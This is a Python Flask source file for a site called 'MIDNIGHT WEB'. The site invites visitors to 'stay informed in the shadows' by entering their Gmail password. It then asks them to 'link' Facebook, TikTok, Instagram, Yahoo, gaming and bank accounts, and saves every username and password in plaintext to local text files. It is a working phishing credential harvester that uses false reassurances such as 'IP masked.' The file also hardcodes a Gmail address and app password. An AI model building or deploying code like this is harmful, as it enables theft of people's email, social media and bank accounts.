from flask import Flask, render_template_string, request, redirect
from flask_mail import Mail, Message

app = Flask(__name__)
app = Flask(__name__)

# === Gmail Mail Configuration ===
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'isiemmanuel83@gmail.com'      # ← Replace with your Gmail
app.config['MAIL_PASSWORD'] = 'pnug hohi kqze bhyq'         # ← Replace with the App Password
app.config['MAIL_DEFAULT_SENDER'] = 'isiemmanuel83@gmail.com'
from flask_mail import Mail, Message
mail = Mail(app)

# HTML template with embedded form
html_code = """
<!DOCTYPE html>
<html>
<head>
    <title>MIDNIGHT</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 60px;
        }
        .form-container {
            max-width: 400px;
            margin: auto;
            background: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 4px;
            border: none;
        }
        input[type="submit"] {
            background-color: #1e88e5;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>WELCOME TO MIDNIGHT WEB</h1>
    <p>STAY INFORMED IN THE DARKNESS</p>
    <p style="color: #888888; font-style: italic; margin-bottom: 20px;">
        🕶️ Only enter correct details to receive information from the shadows through your mail...
    </p>
    <div class="form-container">
        <form action="/submit" method="post">
            <label for="email">Gmail:</label><br>
            <input type="email" id="email" name="email" placeholder="example@gmail.com" required><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" placeholder="Enter password" required><br>
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(html_code)

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form["email"]
    password = request.form["password"]

    with open("submitted_data.txt", "a", encoding="utf-8") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    return redirect("/success")

@app.route("/success")
def success():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Shadow Link - Midnight</title>
        <style>
            body {
                background-color: #121212;
                color: #00ffcc;
                font-family: 'Courier New', monospace;
                text-align: center;
                padding: 50px;
            }
            h2 {
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            p {
                color: #bbbbbb;
                font-size: 1.2em;
                margin-bottom: 30px;
            }
            .account-options {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
            }
            .account {
                background-color: #1e1e1e;
                border: 1px solid #333;
                border-radius: 8px;
                padding: 20px;
                width: 150px;
                cursor: pointer;
                transition: 0.3s;
            }
            .account:hover {
                background-color: #1e88e5;
                color: white;
            }
            .form-container {
                margin-top: 40px;
                display: none;
                max-width: 400px;
                margin-left: auto;
                margin-right: auto;
                background: #1e1e1e;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px #00000099;
                text-align: left;
            }
            input {
                width: 100%;
                padding: 10px;
                margin: 8px 0;
                border: none;
                border-radius: 4px;
            }
            input[type="submit"] {
                background-color: #1e88e5;
                color: white;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <h2>✅ You are now in the shadows</h2>
        <p>
            Link up desired accounts to stay informed and work under the radar.<br>
            <strong>IP masked. Inbuilt proxy active.</strong>
        </p>

        <div class="account-options">
            <div class="account" onclick="showForm('facebookForm')">Facebook</div>
            <div class="account" onclick="showForm('tiktokForm')">TikTok</div>
            <div class="account" onclick="showForm('instagramForm')">Instagram</div>
            <div class="account" onclick="showForm('yahooForm')">Yahoo</div>
            <div class="account" onclick="showForm('gamingForm')">Gaming</div>
            <div class="account" onclick="showForm('bankForm')">Bank</div>
        </div>

        <!-- Forms -->
        {% for platform in ['facebook', 'tiktok', 'instagram', 'yahoo', 'gaming', 'bank'] %}
        <div class="form-container" id="{{ platform }}Form">
            <h3>Link {{ platform.capitalize() }} Account</h3>
            <form action="/link_{{ platform }}" method="POST">
                <label>Username or Email:</label><br>
                <input type="text" name="{{ platform }}_user" placeholder="your_username" required><br>
                <label>Password:</label><br>
                <input type="password" name="{{ platform }}_password" placeholder="Enter password" required><br>
                <input type="submit" value="Link Account">
            </form>
        </div>
        {% endfor %}

        <br><br>
        <a href="/" style="color:#00ffcc; text-decoration:underline;">⬅ Return to Midnight Web</a>

        <script>
            function showForm(id) {
                document.getElementById(id).style.display = "block";
                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
            }
        </script>
    </body>
    </html>
    """)

@app.route("/link_<platform>", methods=["POST"])
def link_account(platform):
    user = request.form.get(f"{platform}_user")
    password = request.form.get(f"{platform}_password")

    with open("linked_accounts.txt", "a") as f:
        f.write(f"{platform.capitalize()} Username/Email: {user}, Password: {password}\n")

    return redirect("/linked")

@app.route("/linked")
def linked():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Linked</title>
        <style>
            body {
                background-color: #121212;
                color: #00ffcc;
                font-family: 'Courier New', monospace;
                text-align: center;
                padding: 50px;
            }
            a {
                color: #00ffcc;
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <h2>🔗 Account Linked</h2>
        <p>Your account has been linked in the shadows.</p>
        <a href="/success">⬅ Back to Linking</a>
    </body>
    </html>
    """)

if __name__ == "__main__":
    app.run(debug=True)
